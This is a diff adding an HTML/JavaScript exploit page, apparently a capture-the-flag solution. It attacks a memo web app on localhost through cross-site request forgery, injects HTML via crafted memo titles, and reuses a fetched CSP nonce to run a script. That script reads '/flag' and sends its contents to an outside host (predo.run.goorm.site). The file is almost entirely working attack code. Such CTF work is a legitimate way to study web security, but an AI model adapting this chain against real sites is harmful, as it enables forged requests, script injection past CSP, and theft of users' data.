@@ -1,0 +1,43 @@
+<script>
+    const TARGET = "http://127.0.0.1:3000";
+    const FILESERVER = "http://127.0.0.1:8000";
+    let nonce =''
+    let oldCookie = ''
+    function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+
+    async function csrf(title, content) {
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = TARGET + "/memo";
+        form.target = "w";
+		form.enctype = "multipart/form-data";
+        const input = document.createElement("input");
+        input.name = "title";
+        input.value = title;
+        form.appendChild(input);
+        const input2 = document.createElement("input");
+        input2.name = "content";
+        input2.value = content;
+        form.appendChild(input2);
+
+        document.body.appendChild(form);
+		
+        form.submit();
+        form.remove();
+    }
+
+    onload = async() => {
+		w = window.open("", "w");
+        csrf("asdf", "<iframe name='$'$`")
+        await sleep(500);
+        w.location = FILESERVER + '/uploads/test.html.br'; // file server에 올라와있는 html코드로 지정
+        await sleep(1000);
+		
+        const nonce = await fetch('/get_nonce').then(r => r.text());
+        await sleep(500);
+        csrf(`<iframe srcdoc="<script nonce='${nonce}'>fetch('/flag').then(r=>r.text()).then(f=>fetch('http://predo.run.goorm.site?q='+encodeURIComponent(f)));<\/script>"></iframe>`, "qwqw");
+        
+    }
+</script>
